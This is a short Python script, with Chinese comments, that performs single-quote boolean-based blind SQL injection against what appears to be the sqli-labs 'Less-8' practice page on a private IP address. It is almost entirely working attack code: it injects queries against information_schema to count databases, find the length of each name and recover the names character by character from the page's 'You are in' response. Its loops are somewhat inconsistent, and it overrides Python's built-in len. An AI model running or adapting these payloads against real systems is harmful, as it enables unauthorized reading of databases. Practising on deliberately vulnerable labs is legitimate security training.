#单引号get型布尔盲注
import  requests



url="http://192.168.222.131/Less-8/?id=1'and "

number=int(input("查询第几个数据库："))
def len(number):
    for h in range(0,number):
        num=0
        payload1 = url + "(select count(schema_name) from information_schema.schemata ) <=%d --+" %h
        req=requests.get(payload1)
        num=h+1
        if  "You are in" in req.text:
            break
        for i in range(1,20):
            length=0
            payload2 = url + "length((select schema_name from information_schema.schemata limit %d,1))<=%d --+" %(h,i)
            r=requests.get(payload2)

            if "You are in" in r.text:
                length = i
                break

        print('数据库%s长度为:%s'%(num,length))
    return length

def db_name(db_length):
    for i in range(0,5):
        zmb='abcdefghijklmnopqrstuvwxyz_'
        db_names=''
        for a in range(1,db_length+1):
            for e in zmb:
                paylaod = url + "left((select schema_name from information_schema.schemata limit %d,1),%d)='%s%s' --+" %(i,a,db_names,e)
                r=requests.get(paylaod)

                if 'You are in' in r.text:
                    db_names=db_names + e
                    break
        print(db_names)
    return db_names
db_name(18)
